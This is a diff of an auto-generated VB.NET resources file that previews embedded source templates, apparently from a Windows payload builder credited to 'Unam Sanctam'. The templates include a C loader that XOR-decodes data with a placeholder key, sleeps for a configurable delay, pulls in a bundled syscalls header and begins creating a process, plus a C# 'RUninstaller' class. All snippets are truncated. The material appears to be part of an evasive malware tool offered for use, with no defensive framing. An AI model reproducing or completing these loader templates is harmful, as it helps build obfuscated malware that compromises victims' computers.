@@ -111,6 +111,16 @@ Namespace My.Resources
         End Property
         
         '''<summary>
+        '''  Looks up a localized resource of type System.Byte[].
+        '''</summary>
+        Friend ReadOnly Property Includes() As Byte()
+            Get
+                Dim obj As Object = ResourceManager.GetObject("Includes", resourceCulture)
+                Return CType(obj,Byte())
+            End Get
+        End Property
+        
+        '''<summary>
         '''  Looks up a localized resource of type System.Drawing.Bitmap.
         '''</summary>
         Friend ReadOnly Property microsoft_admin() As System.Drawing.Bitmap
@@ -132,7 +142,6 @@ Namespace My.Resources
         '''using System.Security.Principal;
         '''using System.Text;
         '''using System.Threading;
-        '''using Microsoft.Win32;
         '''#if DefDebug
         '''using System.Windows.Forms;
         '''#endif
@@ -141,7 +150,7 @@ Namespace My.Resources
         '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
         '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
         '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
-        '''[assembly:  [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyProduct(&quot;%Produ [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
@@ -154,25 +163,24 @@ Namespace My.Resources
         '''#include &lt;stdlib.h&gt;
         '''#include &lt;windows.h&gt;
         '''#include &lt;sys/types.h&gt;
-        '''#include &lt;syscalls.h&gt;
+        '''#include &quot;Includes/syscalls.h&quot;
         '''
         '''/* Created by Unam Sanctam, https://github.com/UnamSanctam */
         '''
         '''char* cipher(char* data, long dataLen) {
-        '''	char* key = &quot;#KEY&quot;;
-        '''	int keyLen = strlen(key);
         '''	char* output = (char*)malloc(sizeof(char) * dataLen+1);
         '''	output[dataLen] = 0;
-        '''	for (int i = 0; i &lt; dataLen; ++i) {
-        '''		output[i] = data[i] ^ key[i % keyLen];
+        '''	for (int i = 0; i &lt; dataLen; i++) {
+        '''		output[i] = data[i] ^ &quot;#KEY&quot;[i % #KEYLENGTH];
         '''	}
         '''	return output;
         '''}
         '''
-        '''int main(int argc, char **argv){
+        '''int main(int argc, char** argv) {
         '''	Sleep(#DELAY * 1000);
         '''
-        '''	PROCESS_INFORMATI [rest of string was truncated]&quot;;.
+        '''	PROCESS_INFORMATION p_info;
+        '''	STARTUPINFO s_info  [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program1() As String
             Get
@@ -201,7 +209,7 @@ Namespace My.Resources
         '''            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
         '''            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
         '''            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
-        '''			VALUE &quot; [rest of string was truncated]&quot;;.
+        '''			VALUE &quot;LegalTrademark&quot;, &quot;#T [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property resource() As String
             Get
@@ -227,11 +235,9 @@ Namespace My.Resources
         '''using System.Windows.Forms;
         '''#endif
         '''
-        '''[assembly: Guid(&quot;%Guid%&quot;)]
-        '''
         '''public partial class RUninstaller
         '''{
-        '''    public static string rbD = (Environment.GetFolderPath(Env [rest of string was truncated]&quot;;.
+        '''    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.App [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Uninstaller() As String
             Get
